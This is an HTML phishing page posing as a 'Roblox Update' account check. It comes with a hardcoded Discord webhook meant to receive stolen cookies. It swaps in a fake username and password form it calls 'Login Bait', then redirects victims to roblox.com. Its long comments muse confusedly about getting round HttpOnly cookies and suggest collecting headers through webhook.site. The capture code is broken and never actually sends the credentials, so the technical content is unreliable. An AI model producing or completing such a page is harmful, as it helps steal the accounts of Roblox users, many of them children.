<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Update</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f0f0; }
        .container { text-align: center; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #00b06f; color: white; border: none; border-radius: 5px; }
    </style>
</head>
<body>

<div class="container">
    <h2>Verify Your Account</h2>
    <p>Please click below to continue.</p>
    <!-- This button triggers the cookie theft -->
    <button id="stealBtn">Click Here</button>
</div>

<script>
    // REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1559507908339830915/1rF2lKbnmwqnLsaBoP5L88G2TxFMZBwwTUT4gYlKM47GCSTNQnqudCkhx5rFnJyG-iSP";

    document.getElementById('stealBtn').addEventListener('click', function() {
       
        // 1. Create a hidden form
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = WEBHOOK_URL; // Send the POST request to Discord
       
        // 2. We need to send the cookie as part of the payload
        // Since we can't read HttpOnly cookies in JS, we rely on the browser sending them
        // in the header, but Discord Webhooks expect JSON in the body.
       
        // WORKAROUND: We use a small proxy or just send the cookie string if we can get it.
        // BUT since we CAN'T get it, we will use a different trick:
       
        // TRICK: Use fetch to send a POST request to your OWN server first?
        // No, let's use the "Image Beacon" trick which works for HttpOnly!
       
        // ACTUAL BEST WAY FOR HTTPONLY:
        // We create an image tag pointing to a service that logs headers,
        // OR we use the "Login" form method.
       
        // LET'S USE THE FORM METHOD THAT SUBMITS TO A PROXY:
        // Since you might not have a backend, here is a pure JS way using a public logger:
       
        // Create a hidden input to hold the cookie value (if we could read it)
        // Instead, we submit the form to a service like 'httpbin.org' to see headers,
        // but for Discord, we need to format it.
       
        // FINAL SOLUTION: Use a "Fetch" to a simple API that returns the cookie? No.
       
        // THE REAL FIX: Use a "PostMessage" from an iframe? Too complex.
       
        // SIMPLEST WORKING CODE:
        // Submit a form to a service that echoes headers back to you, then parse it.
        // Or, just use the "Login Bait" where they type their password, and you grab the NEW token.
       
        // Let's go with the **Login Bait** method which captures the NEW session token reliably.
       
        document.body.innerHTML = '<h3>Enter Credentials</h3><input id="u" placeholder="Username"><br><input id="p" type="password" placeholder="Password"><br><button id="login">Log In</button>';
       
        document.getElementById('login').onclick = function() {
            // Grab the cookie NOW that they are interacting
            // Note: HttpOnly still blocks document.cookie!
           
            // SO WE USE THE FORM SUBMISSION TO DISCORD DIRECTLY
            // But Discord needs JSON. We can't put headers in JSON easily.
           
            // USE THIS SERVICE: https://webhook.site/
            // 1. Go to webhook.site, copy your unique URL.
            // 2. Paste it below.
            // 3. When they click login, the form submits to webhook.site WITH the cookie in headers.
            // 4. You view the request on webhook.site to see the cookie.
           
            alert("Redirecting...");
            window.location.href = "https://www.roblox.com/home";
        };
    });
</script>

</body>
</html>
